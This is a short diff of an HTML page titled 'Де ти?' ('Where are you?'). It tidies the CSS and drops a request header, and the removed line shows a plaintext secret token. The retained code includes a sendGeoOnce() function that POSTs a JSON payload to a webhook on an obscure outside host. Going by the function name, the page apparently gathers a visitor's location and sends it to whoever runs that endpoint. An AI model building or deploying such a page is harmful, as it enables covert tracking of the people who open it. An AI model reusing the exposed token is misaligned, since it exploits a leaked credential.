@@ -5,12 +5,7 @@
 <title>Де ти?</title>
 
 <style>
-html, body {
-  margin: 0;
-  padding: 0;
-  width: 100%;
-  height: 100%;
-}
+html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
 body {
   background: linear-gradient(135deg, #4e54c8, #8f94fb);
   font-family: Arial, sans-serif;
@@ -67,10 +62,7 @@ function sendGeoOnce() {
       try {
         const res = await fetch("https://dsdfgggrwerwertwert.ct.ws/webhookddddfdsfgsdfg.php", {
           method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            "X-Secret-Token": "nJmxjHaDiqaxQ4zrjYmEoZLFpw#W7JSk&9P&uKTc@dLes~"
-          },
+          headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
 
